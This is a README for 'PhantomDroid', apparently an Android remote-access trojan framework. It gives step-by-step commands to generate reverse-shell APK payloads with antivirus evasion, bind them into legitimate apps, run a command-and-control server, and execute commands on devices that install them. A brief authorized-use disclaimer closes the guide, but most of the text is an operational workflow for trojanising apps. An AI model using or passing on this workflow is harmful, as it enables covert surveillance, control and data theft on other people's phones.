# 🚀 How to Run PhantomDroid Framework v2.0

**Created by: M DHARAN RAJ - Web Developer & Ethical Hacker**

## 📋 Prerequisites

### For Windows (Your Current System)
1. **Install Python 3.8+**
   - Download from: https://python.org/downloads/
   - Make sure to check "Add Python to PATH"

2. **Install Java Development Kit (JDK)**
   - Download OpenJDK 11+: https://adoptium.net/
   - Set JAVA_HOME environment variable

3. **Install Android SDK Tools**
   - Download Android Studio or SDK tools
   - Add to PATH: `platform-tools` and `build-tools`

4. **Install Git Bash** (for shell script execution)
   - Download from: https://git-scm.com/download/win

## 🎯 Quick Start Guide

### Step 1: Setup Environment
```bash
# Open Git Bash or PowerShell as Administrator
cd "d:/VS Code/AndroPhantom"

# Install Python dependencies
pip install flask cryptography requests lxml beautifulsoup4 pillow

# Make scripts executable (Git Bash)
chmod +x phantomdroid.sh
chmod +x install.sh
```

### Step 2: Run PhantomDroid

#### Option A: Interactive Shell Mode (Recommended)
```bash
# In Git Bash
./phantomdroid.sh

# Or in PowerShell
bash phantomdroid.sh
```

#### Option B: Direct Python Execution
```bash
# Generate payload directly
python core/payload_generator.py --type tcp_reverse --lhost 192.168.1.100 --lport 4444

# Bind to APK
python core/apk_binder.py --apk original.apk --lhost 192.168.1.100 --lport 4444 --method 1

# Start C2 server
python core/c2_server.py --port 8080 --protocol 1

# Start web interface
python core/web_interface.py
```

#### Option C: Web Interface
```bash
# Start web interface
python core/web_interface.py

# Open browser and go to:
# http://localhost:8080
```

## 🖥️ Windows-Specific Instructions

### Using PowerShell
```powershell
# Navigate to framework directory
cd "d:\VS Code\AndroPhantom"

# Install dependencies
pip install -r requirements.txt

# Run main script
python -c "
import subprocess
import sys
subprocess.run([sys.executable, 'core/payload_generator.py', '--help'])
"

# Or run individual modules
python core/payload_generator.py --type tcp_reverse --lhost 192.168.1.100 --lport 4444
```

### Using Command Prompt
```cmd
cd "d:\VS Code\AndroPhantom"
python core\payload_generator.py --type tcp_reverse --lhost 192.168.1.100 --lport 4444
```

## 🎮 Usage Examples

### 1. Generate TCP Reverse Shell
```bash
# Interactive mode
./phantomdroid.sh
# Select option 1, then follow prompts

# Command line mode
python core/payload_generator.py \
    --type tcp_reverse \
    --lhost 192.168.1.100 \
    --lport 4444 \
    --evasion medium
```

### 2. Bind Payload to Existing APK
```bash
# Interactive mode
./phantomdroid.sh
# Select option 2, then follow prompts

# Command line mode
python core/apk_binder.py \
    --apk "C:/path/to/original.apk" \
    --lhost 192.168.1.100 \
    --lport 4444 \
    --method 1 \
    --evasion high
```

### 3. Start C2 Server
```bash
# Interactive mode
./phantomdroid.sh
# Select option 6

# Direct execution
python core/c2_server.py --port 8080 --protocol 1
```

### 4. Web Interface
```bash
# Start web server
python core/web_interface.py

# Access dashboard at:
# http://localhost:8080
```

## 🔧 Configuration

### Edit Configuration Files
```bash
# Core settings
notepad config/core.conf

# Payload settings
notepad config/payloads.conf
```

### Example Configuration
```ini
# config/core.conf
[general]
debug = true
verbose = true
auto_cleanup = false

[evasion]
default_level = high
enable_encryption = true
```

## 📁 Output Structure
```
output/
├── payloads/          # Generated APK files
│   ├── phantom_tcp_20241210_101530.apk
│   └── phantom_http_20241210_102045.apk
├── signed/            # Signed and bound APKs
│   ├── phantom_bound_20241210_103000_signed.apk
│   └── original_modified_signed.apk
├── temp/              # Temporary working files
└── logs/              # Framework logs
    ├── phantomdroid.log
    └── c2_server.log
```

## 🐛 Troubleshooting

### Common Windows Issues

1. **Python not found**
   ```bash
   # Add Python to PATH or use full path
   C:\Python39\python.exe core/payload_generator.py --help
   ```

2. **Permission denied**
   ```bash
   # Run PowerShell as Administrator
   # Or use Git Bash
   ```

3. **Java not found**
   ```bash
   # Install JDK and set JAVA_HOME
   set JAVA_HOME=C:\Program Files\Java\jdk-11.0.x
   ```

4. **Module not found**
   ```bash
   # Install missing modules
   pip install flask cryptography
   ```

### Debug Mode
```bash
# Enable debug output
python core/payload_generator.py --type tcp_reverse --lhost 192.168.1.100 --lport 4444 --debug
```

## 🌐 Network Setup

### For Testing (Local Network)
```bash
# Find your IP address
ipconfig

# Use your local IP as LHOST
# Example: 192.168.1.100
```

### For External Testing (With Permission)
```bash
# Use your public IP or VPS
# Example: your-server.com or public IP
```

## 🎯 Complete Workflow Example

```bash
# 1. Start framework
./phantomdroid.sh

# 2. Generate payload (Option 1)
#    - Type: TCP Reverse Shell
#    - LHOST: 192.168.1.100
#    - LPORT: 4444
#    - Evasion: High

# 3. Start C2 server (Option 6)
#    - Port: 8080
#    - Protocol: HTTP/HTTPS

# 4. Install generated APK on test device
#    - Enable "Unknown sources"
#    - Install phantom_tcp_*.apk

# 5. Monitor C2 dashboard
#    - Open http://localhost:8080
#    - View active sessions
#    - Execute commands
```

## ⚠️ Important Notes

### Legal Compliance
- ✅ Only use on devices you own
- ✅ Obtain written permission for testing
- ✅ Follow local laws and regulations
- ❌ Never use on unauthorized systems

### Security
- Use isolated test networks
- Don't test on production systems
- Secure your testing environment
- Document all activities

## 🆘 Support

If you encounter issues:

1. **Check logs**: `tail -f logs/phantomdroid.log`
2. **Enable debug**: Add `--debug --verbose` flags
3. **Verify dependencies**: Run `python --version` and `java -version`
4. **Check permissions**: Run as administrator if needed

## 📞 Contact

**M DHARAN RAJ**  
*Web Developer & Ethical Hacker*

---

**Remember**: Use PhantomDroid responsibly and only for authorized security testing! 🔒
